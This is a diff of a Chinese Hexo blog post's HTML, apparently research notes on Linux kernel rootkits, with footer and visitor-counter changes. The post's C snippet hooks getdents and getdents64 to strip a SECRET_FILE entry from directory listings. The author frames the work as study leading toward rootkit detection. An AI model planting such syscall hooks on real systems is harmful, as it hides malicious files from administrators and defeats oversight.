triggered on a Kali i686-pae installation.</span></span><br><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_getdents64(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd,</span><br><span class="line">                struct linux_dirent64 __user *dirent,</span><br><span class="line">                <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = real_getdents64(fd, dirent, count);</span><br><span class="line"></span><br><span class="line">    print_dents64(dirent, ret);</span><br><span class="line">    ret = remove_dent64(SECRET_FILE, dirent, ret);</span><br><span class="line">    print_dents64(dirent, ret);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_getdents(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,</span><br><span class="line">              struct linux_dirent __user *dirent,</span><br><span class="line">              <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = real_getdents(fd, dirent, count);</span><br><span class="line"></span><br><span class="line">    print_dents(dirent, ret);</span><br><span class="line">    ret = remove_dent(SECRET_FILE, dirent, ret);</span><br><span class="line">    print_dents(dirent, ret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// INFO: It was triggered on a Kali i686-pae installation.</span></span><br><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_getdents64(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,</span><br><span class="line">                struct linux_dirent64 __user *dirent,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = real_getdents64(fd, dirent, count);</span><br><span class="line"></span><br><span class="line">    print_dents64(dirent, ret);</span><br><span class="line">    ret = remove_dent64(SECRET_FILE, dirent, ret);</span><br><span class="line">    print_dents64(dirent, ret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="./image-20200810001424387.png" alt="image-20200810001424387"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>代码非常简单，难的是在脑中构建一整套程序底层运行流程，需要将很多零碎的东西串联起来；下期抽空整理输出下常见rootkit lkm隐藏技术及rkhunter/chkrootkit源码分析，再之后rookit这块的研究更多将偏向检测等。</p>
@@ -369,7 +367,7 @@
 <p><a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/sys_call_table.html" target="_blank" rel="noopener">https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/sys_call_table.html</a></p>
 <p><a href="https://www.freebuf.com/articles/system/108392.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/108392.html</a></p>
 <p><a href="https://kernelhacking.com/rodrigo/docs/StMichael/kernel-land-rootkits.pdf" target="_blank" rel="noopener">https://kernelhacking.com/rodrigo/docs/StMichael/kernel-land-rootkits.pdf</a></p>
-</body></html>
+
     </div>
 
     
@@ -444,10 +442,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -473,6 +501,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
